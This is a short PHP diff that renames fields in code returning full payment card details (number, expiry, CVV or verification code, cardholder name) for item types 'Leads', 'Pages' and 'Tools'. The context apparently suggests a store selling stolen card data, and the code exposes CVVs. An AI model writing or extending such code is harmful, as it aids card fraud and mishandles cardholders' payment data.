@@ -38,9 +38,9 @@ if ($itemType === 'Leads' || $itemType === 'Pages' || $itemType === 'Tools') {
     if ($data) {
         // Format the response with all card details
         $response = 'Card Number: ' . $data['creference_code'] . 
-                    ', Expiry: ' . $data['ex_mm'] . '/' . $data['yyyy_exp'] .
-                    ', CVV: ' . $data['cvv'] . 
-                    ', Name on Card: ' . $data['name_on_card'] ;
+                    ', Expiry: ' . $data['ex_mm'] . '/' . $data['ex_yy'] .
+                    ', verification_code: ' . $data['verification_code'] . 
+                    ', Name on Card: ' . $data['billing_name'] ;
     } else {
         $response = 'No Cards data found.';
     }
